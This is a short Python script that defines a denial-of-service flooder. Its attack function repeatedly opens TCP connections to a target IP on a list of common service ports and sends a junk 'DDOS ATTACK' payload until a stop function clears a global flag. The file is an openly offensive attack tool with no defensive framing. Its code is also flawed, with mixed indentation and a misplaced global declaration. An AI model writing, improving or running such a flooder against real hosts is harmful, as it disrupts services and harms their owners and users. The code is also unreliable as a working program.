import socket
import random
#port = 80
ports = [80,22,21,23,8080,443,53,145,139,25,88,20,1337,3306,445]
count = 0

global status
status = False


def attack(ip):
    global status
    status = True
    while status:
        for source_port in ports:
            global status
            if status:
				try:
					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					s.settimeout(1.0)
					s.connect((ip, source_port))
					s.send("DDOS ATTACK"*1000)
					s.close()
				except:
					pass
            else:
                return

def stop():
    global status
    status = False
    print("STOPED %s" % status)
